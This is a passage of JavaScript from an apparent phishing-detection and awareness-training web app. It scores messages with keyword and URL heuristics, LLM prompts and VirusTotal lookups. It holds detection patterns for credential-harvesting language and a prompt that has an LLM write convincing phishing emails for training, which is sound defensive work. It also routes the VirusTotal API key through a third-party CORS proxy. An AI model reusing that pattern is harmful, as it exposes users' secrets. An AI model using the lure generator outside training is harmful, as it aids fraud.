                analysis.riskScore = Math.max(analysis.riskScore, 85);
                analysis.verdict = 'PHISHING';
                if (!analysis.techniques.includes('T1566.002: Malicious URL (VirusTotal Flagged)')) {
                    analysis.techniques.unshift('T1566.002: Malicious URL (VirusTotal Flagged)');
                }
            }

            // 5 - Render UI
            lastScanData = {
                timestamp: new Date().toISOString(),
                engine: engineUsed,
                message: message,
                urls: urls,
                analysis: analysis,
                vtResults: vtResults
            };

            renderResults(analysis, urls, vtResults, engineUsed);

        } catch (err) {
            console.error('Phish-Guard scan error:', err);
            showError(err.message || 'An unexpected error occurred during analysis.');
        } finally {
            setLoading(false);
        }
    }

    // ================================================================
    //  URL EXTRACTION
    // ================================================================
    function extractURLs(text) {
        const urlRegex = /\b(?:https?:\/\/|www\.)[^\s<>"{}|\\^`[\]]+/gi;
        const matches = text.match(urlRegex) || [];
        const normalized = matches.map(u => u.startsWith('http') ? u : 'http://' + u);
        return [...new Set(normalized)];
    }

    // ================================================================
    //  PSYCHOLOGICAL / COGNITIVE ANALYSIS LAYER
    // ================================================================
    const PSYCH_LIBRARY = [
        {
            name: 'False Urgency (Time Pressure)',
            icon: '⏰',
            severity: 'high',
            patterns: [/\b(immediately|urgent|right away|act now|within \d+\s*hours?|by .*pm|asap|at once|no later than)\b/i],
            description: 'Attackers compress your decision window so you skip verification and act on emotion.'
        },
        {
            name: 'Authority Impersonation',
            icon: '👔',
            severity: 'high',
            patterns: [/\b(ceo|cfo|executive|board|director|owner|manager)\b/i, /\b(helpdesk|it department|hr department|payroll|security team|fraud department)\b/i],
            description: 'Impersonating executives or trusted departments leverages natural obedience to authority figures.'
        },
        {
            name: 'Fear & Intimidation',
            icon: '⚠️',
            severity: 'high',
            patterns: [/\b(suspended|deactivated|terminated|permanently|revoked|arrest|legal action|lawsuit|compromised)\b/i],
            description: 'Threats of loss trigger fight-or-flight, overriding rational decision-making.'
        },
        {
            name: 'Curiosity Bait / Open Loop',
            icon: '🎣',
            severity: 'med',
            patterns: [/\b(unusual activity|unauthorized|you have (a new|received)|claim (your|this)|check (this|what)|exclusive|secret|confidential)\b/i],
            description: 'Open loops exploit the brain\'s compulsion to resolve ambiguity and incomplete information.'
        },
        {
            name: 'Scarcity / Reward Lure',
            icon: '🎁',
            severity: 'med',
            patterns: [/\b(bonus|prize|reward|refund|gift card|discount|limited time|only \d+ (left|remaining)|claim bonus)\b/i],
            description: 'Reward framing suppresses skepticism by activating desire and loss-aversion circuits.'
        },
        {
            name: 'Credential Harvesting',
            icon: '🔐',
            severity: 'high',
            patterns: [/\b(password|credentials|sign.in|verify your (identity|account)|confirm your (password|login)|validate your)\b/i],
            description: 'The attacker\'s end goal — tricking you into entering credentials on a spoofed portal.'
        }
    ];

    function detectPsychTriggers(text) {
        var triggers = [];
        var lower = text.toLowerCase();
        PSYCH_LIBRARY.forEach(function (t) {
            var matched = null;
            t.patterns.forEach(function (rx) {
                var m = lower.match(rx);
                if (m && !matched) matched = m[0];
            });
            if (matched) {
                triggers.push({
                    name: t.name, icon: t.icon, severity: t.severity,
                    quote: matched.replace(/\s+/g, ' ').trim().slice(0, 80),
                    description: t.description
                });
            }
        });
        return triggers;
    }

    function buildPlainEnglish(score, verdict, cues, urls) {
        var cueList = cues && cues.length
            ? cues.map(function (c) { return c.replace(/^(Social Engineering: |T\d+(\.\d+)?[a-z]*: )/gi, '').toLowerCase(); }).join(', ')
            : null;

        var tlDr;
        if (verdict === 'SAFE') tlDr = 'No need to panic — this message shows no warning signs and appears legitimate.';
        else if (verdict === 'SUSPICIOUS') tlDr = 'We are not sure about this one. It has patterns often seen in scams — verify before trusting it.';
        else tlDr = 'Do not click, reply, or share any details — this message is most likely an attempt to trick you.';

        var whatWeFound = 'We analyzed the wording' + (urls && urls.length ? ' and the link(s) inside' : '') + '. ';
        whatWeFound += cueList
            ? 'It uses techniques like ' + cueList + ' to pressure or deceive you.'
            : 'We did not find obvious scam language or suspicious links.';

        var whyItMatters = verdict === 'SAFE'
            ? 'Even safe-looking messages deserve a quick sender check — attackers mimic everyday emails all the time.'
            : 'A single click or shared credential can give attackers access to your accounts, data, and company network.';

        return { tlDr: tlDr, whatWeFound: whatWeFound, whyItMatters: whyItMatters };
    }

    function sanitizePsychTriggers(arr) {
        if (!Array.isArray(arr)) return [];
        return arr.filter(function (t) { return t && t.name; }).map(function (t) {
            return {
                name: String(t.name),
                icon: String(t.icon || '🧠'),
                severity: (['high', 'med', 'low'].indexOf(t.severity) >= 0) ? t.severity : 'med',
                quote: String(t.quote || ''),
                description: String(t.description || '')
            };
        });
    }

    function normalizeAnalysis(ai, message, urls) {
        if (!ai || typeof ai !== 'object') ai = {};
        var h = analyzeHeuristics(message, urls || extractURLs(message));
        var result = {
            riskScore: Number.isFinite(Number(ai.riskScore))
                ? Math.max(0, Math.min(100, Math.round(Number(ai.riskScore))))
                : h.riskScore,
            verdict: (['SAFE', 'SUSPICIOUS', 'PHISHING'].indexOf((ai.verdict || '').toUpperCase()) >= 0)
                ? ai.verdict.toUpperCase()
                : h.verdict,
            techniques: (Array.isArray(ai.techniques) && ai.techniques.length) ? ai.techniques.map(String) : h.techniques,
            summary: (ai.summary && String(ai.summary).trim()) ? String(ai.summary) : h.summary,
            recommendations: (Array.isArray(ai.recommendations) && ai.recommendations.length) ? ai.recommendations.map(String) : h.recommendations,
            psychTriggers: sanitizePsychTriggers(ai.psychTriggers),
            plainEnglish: (ai.plainEnglish && ai.plainEnglish.tlDr)
                ? {
                    tlDr: String(ai.plainEnglish.tlDr),
                    whatWeFound: String(ai.plainEnglish.whatWeFound || ''),
                    whyItMatters: String(ai.plainEnglish.whyItMatters || '')
                }
                : h.plainEnglish
        };
        if (!result.psychTriggers.length) result.psychTriggers = h.psychTriggers;
        return result;
    }

    // ================================================================
    //  LOCAL HEURISTIC ENGINE (Offline / Fallback)
    // ================================================================
    function analyzeHeuristics(text, urls) {
        const lower = text.toLowerCase();
        let score = 5; // base score
        const techniques = [];
        const detectedCues = [];

        // 1. Urgency & Coercion
        const urgencyPatterns = [
            { rx: /\b(immediately|urgent|within \d+ hours?|right away|act now|suspended|immediate action)\b/i, name: 'Artificial Urgency', weight: 25 },
            { rx: /\b(compromised|unauthorized|fraud|deactivated|permanently closed|revoke|arrest|legal action)\b/i, name: 'Fear & Threat Coercion', weight: 25 },
            { rx: /\b(final notice|last warning|account alert|security alert)\b/i, name: 'High-Priority Alert Simulation', weight: 20 },
        ];
        urgencyPatterns.forEach(p => {
            if (p.rx.test(lower)) {
                score += p.weight;
                techniques.push('Social Engineering: ' + p.name);
                detectedCues.push(p.name);
            }
        });

        // 2. Sensitive Action / Data Requests
        const sensitivePatterns = [
            { rx: /\b(verify your identity|confirm identity|update (your )?(credentials|details|account))\b/i, name: 'T1598: Phishing for Information', weight: 25 },
            { rx: /\b(password|pin code|ssn|social security|credit card|cvv|bank account)\b/i, name: 'T1566: Credential Harvesting', weight: 30 },
            { rx: /\b(gift cards?|apple gift|scratch|wire transfer|western union|bitcoin|crypto)\b/i, name: 'Financial Fraud / Advance Fee Scam', weight: 35 },
            { rx: /\b(board meeting|ceo|executive|discreetly|confidential request)\b/i, name: 'Executive Impersonation (Whaling / BEC)', weight: 25 },
        ];
        sensitivePatterns.forEach(p => {
            if (p.rx.test(lower)) {
                score += p.weight;
                techniques.push(p.name);
                detectedCues.push(p.name);
            }
        });

        // 3. Technical URL Heuristics
        if (urls.length > 0) {
            techniques.push('T1566.002: Embedded External Link');
            urls.forEach(u => {
                try {
                    const parsed = new URL(u);
                    const host = parsed.hostname.toLowerCase();
                    const path = parsed.pathname.toLowerCase();

                    // IP address host
                    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(host)) {
                        score += 35;
                        techniques.push('Suspicious IP-based URL (' + host + ')');
                    }
                    // Suspicious TLDs
                    if (/\.(xyz|top|tk|ml|ga|cf|gq|click|buzz|club|work|rest|cam|online|site)$/i.test(host)) {
                        score += 25;
                        techniques.push('Abused High-Risk TLD (.' + host.split('.').pop() + ')');
                    }
                    // Deceptive brand in subdomain or path
                    if (/(chase|paypal|microsoft|apple|google|amazon|netflix|usps|fedex|bank|wellsfargo)/i.test(host) &&
                        !/(chase\.com|paypal\.com|microsoft\.com|apple\.com|google\.com|amazon\.com|netflix\.com|usps\.com|fedex\.com)$/i.test(host)) {
                        score += 35;
                        techniques.push('Brand Impersonation in Domain Name (' + host + ')');
                    }
                    // Sensitive paths
                    if (/(login|verify|auth|signin|update|secure|redelivery|session|banking)/i.test(path)) {
                        score += 15;
                        techniques.push('Credential/Verification Endpoint (' + path + ')');
                    }
                } catch (_) {}
            });
        }

        // Clamp score 0 - 100
        score = Math.min(100, Math.max(0, score));

        // Deduplicate techniques
        const uniqueTechniques = [...new Set(techniques)];

        // Verdict & Summary
        let verdict = 'SAFE';
        let summary = '';
        const recommendations = [];

        if (score >= 65) {
            verdict = 'PHISHING';
            summary = `High probability social-engineering attack detected. The message exhibits critical threat indicators including ${detectedCues.join(', ') || 'suspicious language and link attributes'}.`;
            recommendations.push('Do NOT click any embedded links or open attachments.');
            recommendations.push('Do NOT provide passwords, gift card codes, or personal verification data.');
            recommendations.push('Report this communication to your organization’s Information Security / SOC team.');
            recommendations.push('Block the sender address and delete the message.');
        } else if (score >= 30) {
            verdict = 'SUSPICIOUS';
            summary = `Moderate threat indicators identified. The message contains elements often seen in phishing or marketing lures (${detectedCues.join(', ') || 'unverified links'}). Exercise caution.`;
            recommendations.push('Verify the sender via a known trusted out-of-band channel (e.g. phone or internal chat).');
            recommendations.push('Inspect any links without clicking by hovering to verify destination domain.');
            recommendations.push('Do not share sensitive credentials.');
        } else {
            verdict = 'SAFE';
            summary = 'No prominent phishing indicators or malicious patterns detected. The message appears standard and legitimate.';
            recommendations.push('Standard security hygiene: ensure you always verify senders when clicking links.');
        }

        return {
            riskScore: score,
            verdict: verdict,
            techniques: uniqueTechniques.length ? uniqueTechniques : ['Standard Communication'],
            summary: summary,
            recommendations: recommendations,
            psychTriggers: detectPsychTriggers(text),
            plainEnglish: buildPlainEnglish(score, verdict, detectedCues, urls)
        };
    }

    // ================================================================
    //  OPENAI GPT-4o-mini ANALYSIS ENGINE
    // ================================================================
    async function analyzeWithOpenAI(message, urls, apiKey) {
        const systemPrompt = `You are a Senior Cybersecurity Threat Analyst specializing in Social Engineering, MITRE ATT&CK T1566 (Phishing), BEC (Business Email Compromise), and cognitive psychology.
Analyze the provided message text and list of extracted URLs.

Respond ONLY with a valid, raw JSON object matching this schema (no markdown fences, no explanatory text outside JSON):
{
  "riskScore": <integer 0 to 100>,
  "verdict": "<SAFE | SUSPICIOUS | PHISHING>",
  "techniques": ["<MITRE ATT&CK or Social Engineering technique tag, e.g. T1566.002: Spearphishing Link, Artificial Urgency, Executive Impersonation, Credential Harvesting>"],
  "summary": "<2-3 sentence concise threat analysis explaining why the message is safe, suspicious, or malicious>",
  "recommendations": ["<Actionable mitigation step 1>", "<Actionable mitigation step 2>", "<Actionable mitigation step 3>"],
  "psychTriggers": [
    {
      "name": "<Psychological tactic exploited, e.g. False Urgency, Authority Impersonation, Fear & Intimidation, Curiosity Bait, Scarcity, Social Proof, Credential Harvesting>",
      "icon": "<single emoji representing the tactic>",
      "severity": "<high | med | low>",
      "quote": "<exact short phrase from the message that triggers this bias>",
      "description": "<one sentence explaining how the attacker exploits this cognitive bias>"
    }
  ],
  "plainEnglish": {
    "tlDr": "<one sentence plain-language verdict: what should the reader do right now?>",
    "whatWeFound": "<2-3 sentences in non-technical language explaining the strongest signals>",
    "whyItMatters": "<1-2 sentences on real-world risk in plain terms>"
  }
}`;

        const userContent = `Message to analyze:\n"""\n${message}\n"""\n\nExtracted URLs found in message:\n${urls.length ? urls.join('\n') : 'None'}`;

        const resp = await fetch('https://api.openai.com/v1/chat/completions', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${apiKey}`
            },
            body: JSON.stringify({
                model: 'gpt-4o-mini',
                messages: [
                    { role: 'system', content: systemPrompt },
                    { role: 'user',   content: userContent   }
                ],
                temperature: 0.1,
                response_format: { type: 'json_object' }
            })
        });

        if (!resp.ok) {
            let errText = '';
            try {
                const errData = await resp.json();
                errText = errData.error?.message || resp.statusText;
            } catch (_) {
                errText = await resp.text();
            }
            if (resp.status === 401) throw new Error('OpenAI API Key is invalid or expired. Please check your key.');
            if (resp.status === 429) throw new Error('OpenAI Rate limit reached or insufficient quota. Please check your OpenAI account credits.');
            throw new Error(`OpenAI API error (${resp.status}): ${errText}`);
        }

        const data = await resp.json();
        const rawContent = data.choices[0]?.message?.content;
        if (!rawContent) throw new Error('OpenAI returned an empty response.');

        return JSON.parse(rawContent);
    }

    // ================================================================
    //  GOOGLE GEMINI 1.5 FLASH ANALYSIS ENGINE
    // ================================================================
    async function analyzeWithGemini(message, urls, apiKey) {
        const systemPrompt = `You are a Senior Cybersecurity Threat Analyst specializing in Social Engineering, MITRE ATT&CK T1566 (Phishing), BEC (Business Email Compromise), and cognitive psychology.
Analyze the provided message text and list of extracted URLs.

Respond ONLY with a valid, raw JSON object matching this schema (no markdown fences, no explanatory text outside JSON):
{
  "riskScore": <integer 0 to 100>,
  "verdict": "<SAFE | SUSPICIOUS | PHISHING>",
  "techniques": ["<MITRE ATT&CK or Social Engineering technique tag>"],
  "summary": "<2-3 sentence concise threat analysis>",
  "recommendations": ["<Actionable mitigation step 1>", "<Actionable mitigation step 2>", "<Actionable mitigation step 3>"],
  "psychTriggers": [
    {
      "name": "<Psychological tactic exploited, e.g. False Urgency, Authority Impersonation, Fear & Intimidation, Curiosity Bait, Scarcity, Social Proof, Credential Harvesting>",
      "icon": "<single emoji>",
      "severity": "<high | med | low>",
      "quote": "<exact short phrase from the message that triggers this bias>",
      "description": "<one sentence explaining how the attacker exploits this cognitive bias>"
    }
  ],
  "plainEnglish": {
    "tlDr": "<one sentence plain-language verdict>",
    "whatWeFound": "<2-3 sentences in non-technical language>",
    "whyItMatters": "<1-2 sentences on real-world risk>"
  }
}`;

        const userContent = `Message to analyze:\n"""\n${message}\n"""\n\nExtracted URLs found in message:\n${urls.length ? urls.join('\n') : 'None'}`;

        const resp = await fetch(
            'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=' + encodeURIComponent(apiKey),
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    contents: [
                        { role: 'user', parts: [{ text: systemPrompt + '\n\n' + userContent }] }
                    ],
                    generationConfig: {
                        temperature: 0.1,
                        maxOutputTokens: 2048,
                        responseMimeType: 'application/json'
                    }
                })
            }
        );

        if (!resp.ok) {
            let errText = '';
            try {
                const errData = await resp.json();
                errText = (errData.error && errData.error.message) || resp.statusText;
            } catch (_) {
                errText = await resp.text();
            }
            if (resp.status === 400 && /API key not valid/i.test(errText)) {
                throw new Error('Gemini API Key is invalid. Please check your key.');
            }
            throw new Error(`Gemini API error (${resp.status}): ${errText}`);
        }

        const data = await resp.json();
        const rawContent = data.candidates && data.candidates[0] && data.candidates[0].content &&
            data.candidates[0].content.parts && data.candidates[0].content.parts[0] &&
            data.candidates[0].content.parts[0].text;
        if (!rawContent) throw new Error('Gemini returned an empty response.');

        let jsonText = rawContent.replace(/^```(?:json)?\s*/i, '').replace(/\s*```$/g, '').trim();
        return JSON.parse(jsonText);
    }

    // ================================================================
    //  VIRUSTOTAL URL SCANNING (via CORS proxy)
    // ================================================================
    async function scanURLsWithVirusTotal(urls, apiKey) {
        const results = [];
        const targetURLs = urls.slice(0, 5);

        for (const url of targetURLs) {
            try {
                const urlId = btoa(url).replace(/=/g, '');
                const targetEndpoint = `https://www.virustotal.com/api/v3/urls/${urlId}`;
                const proxyUrl = `https://corsproxy.io/?${encodeURIComponent(targetEndpoint)}`;

                const resp = await fetch(proxyUrl, {
                    headers: { 'x-apikey': apiKey }
                });

                if (resp.status === 404) {
                    results.push({ url, notFound: true, malicious: 0, suspicious: 0, harmless: 0 });
                    continue;
                }

                if (!resp.ok) {
                    results.push({ url, error: `VT error (${resp.status})` });
                    continue;
                }

                const data = await resp.json();
                const stats = data.data?.attributes?.last_analysis_stats || {};
                results.push({
                    url: url,
                    malicious: stats.malicious || 0,
                    suspicious: stats.suspicious || 0,
                    harmless: stats.harmless || 0,
                    undetected: stats.undetected || 0
                });
            } catch (err) {
                results.push({ url, error: 'Scanning unavailable' });
            }
        }
        return results;
    }

    // ================================================================
    //  RENDER RESULTS
    // ================================================================
    function renderResults(ai, urls, vt, engineName) {
        const scoreClass   = ai.riskScore <= 30 ? 'low' : ai.riskScore <= 64 ? 'medium' : 'high';
        const verdictLower = (ai.verdict || '').toLowerCase();
        const isAi = /GPT|Gemini/i.test(engineName);

        let html = '<div class="result-card">';

        // ---- Engine meta pill ----
        html += ''
            + '<div class="result-engine-meta">'
            +   '<span>Analysis Engine</span>'
            +   '<span class="engine-badge ' + (isAi ? 'engine-ai' : 'engine-heuristic') + '">'
            +     (isAi ? '🤖 ' : '⚡ ') + escapeHtml(engineName)
            +   '</span>'
            + '</div>';

        // ---- Risk header: score bar + verdict badge ----
        html += ''
            + '<div class="risk-header">'
            +   '<div class="risk-score-wrapper">'
            +     '<div class="risk-score-bar">'
            +       '<div class="risk-score-fill ' + scoreClass + '" style="width:' + ai.riskScore + '%"></div>'
            +     '</div>'
            +     '<span class="risk-number">' + ai.riskScore + ' / 100</span>'
            +   '</div>'
            +   '<span class="verdict-badge verdict-' + verdictLower + '">' + escapeHtml(ai.verdict) + '</span>'
            + '</div>';

        // ---- Detected techniques ----
        if (ai.techniques && ai.techniques.length) {
            html += '<div class="techniques">';
            ai.techniques.forEach(function (t) {
                html += '<span class="technique-tag">' + escapeHtml(t) + '</span>';
            });
            html += '</div>';
        }

        // ---- Summary ----
        html += '<div class="summary">' + escapeHtml(ai.summary) + '</div>';

        // ---- Recommendations ----
        if (ai.recommendations && ai.recommendations.length) {
            html += '<div class="recommendations"><h4>Recommended Mitigation Steps</h4><ul>';
            ai.recommendations.forEach(function (r) {
                html += '<li>' + escapeHtml(r) + '</li>';
            });
            html += '</ul></div>';
        }

        // ---- Psychological & Cognitive Manipulation Breakdown ----
        if (ai.psychTriggers && ai.psychTriggers.length) {
            html += '<div class="psych-card">'
                +   '<h4>🧠 Social Engineering &amp; Psychological Tactic Breakdown</h4>'
                +   '<div class="psych-triggers-grid">';
            ai.psychTriggers.forEach(function (t) {
                const sev = t.severity || 'med';
                const sevLabel = { high: 'High', med: 'Medium', low: 'Low' }[sev] || 'Medium';
                html += ''
                    + '<div class="psych-trigger-item sev-' + sev + '">'
                    +   '<div class="psych-header-row">'
                    +     '<span class="psych-tactic-name">' + escapeHtml(t.icon ? t.icon + ' ' : '🧠 ') + escapeHtml(t.name || 'Psychological Tactic') + '</span>'
                    +     '<span class="psych-sev-badge">' + sevLabel + '</span>'
                    +   '</div>'
                    +   (t.quote ? '<span class="psych-quote">"' + escapeHtml(t.quote) + '"</span>' : '')
                    +   '<p class="psych-explanation">' + escapeHtml(t.description || '') + '</p>'
                    + '</div>';
            });
            html += '</div></div>';
        }

        // ---- Plain English Explanation ----
        if (ai.plainEnglish) {
            html += '<div class="plain-english-card">'
                +   '<h4>🗣️ Plain-English Explanation <span style="font-size:0.72rem;opacity:.7;font-weight:600;">(zero jargon)</span></h4>'
                +   '<p><strong>In short:</strong> ' + escapeHtml(ai.plainEnglish.tlDr || ai.summary) + '</p>'
                +   (ai.plainEnglish.whatWeFound ? '<p><strong>What we found:</strong> ' + escapeHtml(ai.plainEnglish.whatWeFound) + '</p>' : '')
                +   (ai.plainEnglish.whyItMatters ? '<p><strong>Why it matters:</strong> ' + escapeHtml(ai.plainEnglish.whyItMatters) + '</p>' : '')
                + '</div>';
        }

        // ---- Extracted URLs ----
        if (urls && urls.length) {
            html += '<div class="urls-section"><h4>Extracted URLs &amp; Indicators (' + urls.length + ')</h4>';
            urls.forEach(function (u) {
                html += '<div class="url-item">' + escapeHtml(u) + '</div>';
            });
            html += '</div>';
        }

        // ---- VirusTotal results ----
        if (vt && vt.length) {
            html += '<div class="vt-section"><h4>VirusTotal Threat Intel</h4>';
            vt.forEach(function (r) {
                if (r.error) {
                    html += ''
                        + '<div class="vt-url">'
                        +   '<span class="vt-url-text">' + escapeHtml(r.url) + '</span>'
                        +   '<span class="vt-status vt-error">' + escapeHtml(r.error) + '</span>'
                        + '</div>';
                } else if (r.notFound) {
                    html += ''
                        + '<div class="vt-url">'
                        +   '<span class="vt-url-text">' + escapeHtml(r.url) + '</span>'
                        +   '<span class="vt-status vt-suspicious">Unrated / New URL</span>'
                        + '</div>';
                } else {
                    let label, cls;
                    if (r.malicious > 0) {
                        label = '⚠️ ' + r.malicious + ' engines flagged malicious';
                        cls   = 'vt-flagged';
                    } else if (r.suspicious > 0) {
                        label = '⚡ ' + r.suspicious + ' suspicious';
                        cls   = 'vt-suspicious';
                    } else {
                        label = '✓ Clean (0 detections)';
                        cls   = 'vt-clean';
                    }
                    html += ''
                        + '<div class="vt-url">'
                        +   '<span class="vt-url-text">' + escapeHtml(r.url) + '</span>'
                        +   '<span class="vt-status ' + cls + '">' + label + '</span>'
                        + '</div>';
                }
            });
            html += '</div>';
        }

        // ---- Action Bar (Export & Copy Report) ----
        html += ''
            + '<div class="result-actions">'
            +   '<button type="button" class="btn-action" id="copyReportBtn">📋 Copy Incident Report</button>'
            +   '<button type="button" class="btn-action" id="downloadJsonBtn">📥 Download JSON</button>'
            + '</div>';

        html += '</div>';
        dom.resultArea.innerHTML = html;

        // Wire up copy and download
        const copyBtn = document.getElementById('copyReportBtn');
        const jsonBtn = document.getElementById('downloadJsonBtn');

        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                copyMarkdownReport(copyBtn);
            });
        }
        if (jsonBtn) {
            jsonBtn.addEventListener('click', () => {
                downloadJsonReport();
            });
        }
    }

    // ================================================================
    //  SECURITY AWARENESS LAB (SIMULATOR)
    // ================================================================
    function initSimulator() {
        dom.btnJudgePhish.addEventListener('click', () => judgeSimScenario(true));
        dom.btnJudgeSafe.addEventListener('click',  () => judgeSimScenario(false));
        dom.btnPrevSim.addEventListener('click',    prevSimScenario);
        dom.btnNextSim.addEventListener('click',    nextSimScenario);
        renderSimScenario();
    }

    function renderSimScenario() {
        const s = SIM_SCENARIOS[currentSimIndex];
        if (!s) return;

        dom.simCurrentIndex.textContent = (currentSimIndex + 1) + ' / ' + SIM_SCENARIOS.length;
        dom.simScenarioCategory.textContent = s.category;
        const diffEl = dom.simScenarioDifficulty;
        diffEl.textContent = s.difficulty;
        diffEl.className = 'sim-diff-badge ' + (s.diffClass || 'diff-med');
        dom.simFrom.textContent = s.from;
        dom.simSubject.textContent = s.subject;
        dom.simBody.textContent = s.body;

        // Reset decision UI
        dom.simDecisionArea.classList.remove('hidden');
        dom.simFeedbackArea.classList.add('hidden');
        dom.simFeedbackArea.className = 'sim-feedback-area hidden';
        dom.simFeedbackArea.innerHTML = '';
        dom.btnJudgePhish.disabled = false;
        dom.btnJudgeSafe.disabled  = false;
        dom.btnPrevSim.disabled = (currentSimIndex === 0);
        dom.btnNextSim.disabled = (currentSimIndex === SIM_SCENARIOS.length - 1);
        dom.btnNextSim.textContent = (currentSimIndex === SIM_SCENARIOS.length - 1)
            ? '🏁 Complete Training'
            : 'Next Scenario →';

        updateSimStats();
    }

    function judgeSimScenario(userSaysPhish) {
        const s = SIM_SCENARIOS[currentSimIndex];
        if (!s || dom.btnJudgePhish.disabled) return;

        simStats.attempted++;
        const isCorrect = (userSaysPhish === s.isPhish);
        if (isCorrect) simStats.correct++;

        dom.btnJudgePhish.disabled = true;
        dom.btnJudgeSafe.disabled  = true;
        dom.simDecisionArea.classList.add('hidden');

        const verdictLabel = s.isPhish ? '🚨 PHISHING ATTACK' : '✅ LEGITIMATE COMMUNICATION';
        let headline = isCorrect
            ? '🎯 Correct! Your threat-detection instincts are sharp.'
            : '😬 Not quite — and that is exactly how real attacks win.';

        let breakdown = '';
        if (s.cognitiveBiases && s.cognitiveBiases.length) {
            breakdown += '<div class="feedback-breakdown"><h5>🧠 Psychological levers used:</h5><ul>';
            s.cognitiveBiases.forEach(b => { breakdown += '<li>' + escapeHtml(b) + '</li>'; });
            breakdown += '</ul></div>';
        }
        if (s.indicators && s.indicators.length) {
            breakdown += '<div class="feedback-breakdown"><h5>🔎 ' + (s.isPhish ? 'Red flags' : 'Green flags') + ' to remember:</h5><ul>';
            s.indicators.forEach(i => { breakdown += '<li>' + escapeHtml(i) + '</li>'; });
            breakdown += '</ul></div>';
        }
        if (s.coaching) {
            breakdown += '<div class="feedback-breakdown" style="border-left-color:#00ff9c;"><h5 style="color:#00ff9c;">💡 Coach\'s Tip</h5><p style="font-size:0.84rem;color:#8b949e;line-height:1.5;margin:0;">' + escapeHtml(s.coaching) + '</p></div>';
        }

        dom.simFeedbackArea.className = 'sim-feedback-area ' + (isCorrect ? 'correct' : 'incorrect');
        dom.simFeedbackArea.innerHTML =
              '<div class="feedback-headline">' + headline + '</div>'
            + '<div class="feedback-body"><strong>Correct answer: ' + verdictLabel + '</strong><br>'
            +   escapeHtml(s.explanation || '') + '</div>'
            + breakdown;

        updateSimStats();
    }

    function updateSimStats() {
        const pct = simStats.attempted ? Math.round((simStats.correct / simStats.attempted) * 100) : 0;
        dom.simScore.textContent = pct + '%';
        dom.simScoreRatio.textContent = simStats.correct + ' / ' + simStats.attempted;
    }

    function prevSimScenario() {
        if (currentSimIndex > 0) {
            currentSimIndex--;
            renderSimScenario();
        }
    }

    function nextSimScenario() {
        if (currentSimIndex < SIM_SCENARIOS.length - 1) {
            currentSimIndex++;
            renderSimScenario();
        }
    }

    function resetSimulator() {
        currentSimIndex = 0;
        simStats = { attempted: 0, correct: 0 };
        renderSimScenario();
    }

    // ================================================================
    //  AI-POWERED SCENARIO GENERATOR
    // ================================================================
    function buildScenarioPrompt() {
        return `Create ONE realistic enterprise phishing awareness training scenario that is DIFFERENT from overused classics (no "gift cards for the CEO", no generic password reset, no Nigerian prince).

Choose a modern, realistic lure: invoice fraud, QR-code quishing, vishing follow-up, voicemail phishing, SaaS consent phishing, payroll impersonation, LinkedIn recruiter bait, or a legitimate-but-ambiguous internal email.

Return strictly valid JSON with this exact schema (no markdown fences):
{
  "category": "<attack category, e.g. Invoice Fraud, SaaS Consent Phishing, Vishing, Quishing>",
  "difficulty": "<Easy | Intermediate | Advanced>",
  "from": "<plausible sender address>",
  "subject": "<email subject line>",
  "body": "<full realistic message body, 4-10 sentences, plausible and detailed. EITHER a convincing phish OR a legitimate but subtly ambiguous email>",
  "isPhish": <true or false>,
  "explanation": "<1-2 sentence explanation of verdict>",
  "cognitiveBiases": ["<psychological lever exploited, e.g. Authority Bias, Scarcity, Social Proof, Curiosity>"],
  "indicators": ["<concrete red flags or green flags>"],
  "coaching": "<one actionable coaching tip>"
}`;
    }

    function normalizeGeneratedScenario(json) {
        const d = {};
        d.category    = String(json.category || 'Generated Scenario');
        d.difficulty  = String(json.difficulty || 'Intermediate');
        d.diffClass   = { 'Easy': 'diff-easy', 'Intermediate': 'diff-med', 'Advanced': 'diff-hard' }[d.difficulty] || 'diff-med';
        d.from        = String(json.from || 'Unknown Sender <unknown@example.com>');
        d.subject     = String(json.subject || 'No Subject');
        d.body        = String(json.body || '');
        d.isPhish     = !!json.isPhish;
        d.title       = String(json.title || d.category);
        d.explanation = String(json.explanation || '');
        d.cognitiveBiases = Array.isArray(json.cognitiveBiases) ? json.cognitiveBiases.map(String) : [];
        d.indicators      = Array.isArray(json.indicators) ? json.indicators.map(String) : [];
        d.coaching        = String(json.coaching || '');
        return d;
    }

    async function generateScenarioGemini(apiKey) {
        const resp = await fetch(
            'https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=' + encodeURIComponent(apiKey),
            {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    contents: [{ role: 'user', parts: [{ text: buildScenarioPrompt() }] }],
                    generationConfig: { temperature: 0.9, maxOutputTokens: 1600, responseMimeType: 'application/json' }
                })
            }
        );
        if (!resp.ok) {
            let errText = '';
            try { errText = (await resp.json()).error?.message || resp.statusText; } catch (_) { errText = await resp.text(); }
            throw new Error('Gemini generate error (' + resp.status + '): ' + errText);
        }
        const data = await resp.json();
        const content = data.candidates?.[0]?.content?.parts?.[0]?.text;
        if (!content) throw new Error('Gemini returned an empty scenario.');
        return JSON.parse(content.replace(/^```(?:json)?\s*/i, '').replace(/\s*```$/g, '').trim());
    }

    async function generateScenarioOpenAI(apiKey) {
        const resp = await fetch('https://api.openai.com/v1/chat/completions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + apiKey },
            body: JSON.stringify({
                model: 'gpt-4o-mini',
                messages: [
                    { role: 'system', content: 'You are a security awareness training content designer. Respond ONLY with valid JSON matching the requested schema.' },
                    { role: 'user', content: buildScenarioPrompt() }
                ],
                temperature: 0.9,
                response_format: { type: 'json_object' }
            })
        });
        if (!resp.ok) {
            let errText = '';
            try { errText = (await resp.json()).error?.message || resp.statusText; } catch (_) { errText = await resp.text(); }
            throw new Error('OpenAI generate error (' + resp.status + '): ' + errText);
        }
        const data = await resp.json();
        const content = data.choices?.[0]?.message?.content;
        if (!content) throw new Error('OpenAI returned an empty scenario.');
        return JSON.parse(content);
    }

    async function generateAIScenario() {
        if (!apiKey) {
            dom.simFeedbackArea.className = 'sim-feedback-area incorrect';
            dom.simFeedbackArea.innerHTML =
                  '<div class="feedback-headline">🔑 API Key Required</div>'
